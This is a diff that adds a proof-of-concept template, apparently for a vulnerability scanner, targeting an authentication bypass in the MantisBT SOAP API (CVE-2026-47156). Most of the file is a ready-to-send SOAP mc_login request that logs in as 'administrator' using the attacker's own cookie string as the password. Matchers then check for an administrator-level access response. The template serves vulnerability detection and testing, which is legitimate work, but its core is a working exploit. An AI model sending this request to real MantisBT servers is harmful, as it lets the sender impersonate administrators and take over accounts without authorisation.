@@ -1,0 +1,54 @@
+[info]
+author = "AVE"
+description = "通过 SOAP API 的 mci_check_login 函数认证绕过漏洞，任意已知 cookie_string 的认证用户可冒充包括管理员在内的任意用户。发送 mc_login SOAP 请求，将目标用户名作为 username、攻击者自己的 MANTIS_STRING_COOKIE 值作为 password，验证是否返回管理员级别的 UserData。"
+id = "POC-AVE-2026-0289"
+name = "MantisBT SOAP API Authentication Bypass PoC"
+severity = "critical"
+tags = [
+    "cve-2026-47156",
+    "mantisbt",
+    "soap",
+    "authentication-bypass",
+]
+vuln_id = [
+    "CVE-2026-47156",
+    "AVE-2026-0289",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/soap/mantisconnect.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:tns="http://futureware.biz/mantisconnect"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <SOAP-ENV:Body>
+    <tns:mc_login>
+      <username xsi:type="xsd:string">administrator</username>
+      <password xsi:type="xsd:string">cookie_attacker_cookie_string_here</password>
+    </tns:mc_login>
+  </SOAP-ENV:Body>
+</SOAP-ENV:Envelope>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/xml; charset=utf-8"
+SOAPAction = ""
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    '<id xsi:type="xsd:integer">1</id>',
+    '<name xsi:type="xsd:string">administrator</name>',
+    '<access_level xsi:type="xsd:integer">90</access_level>',
+]
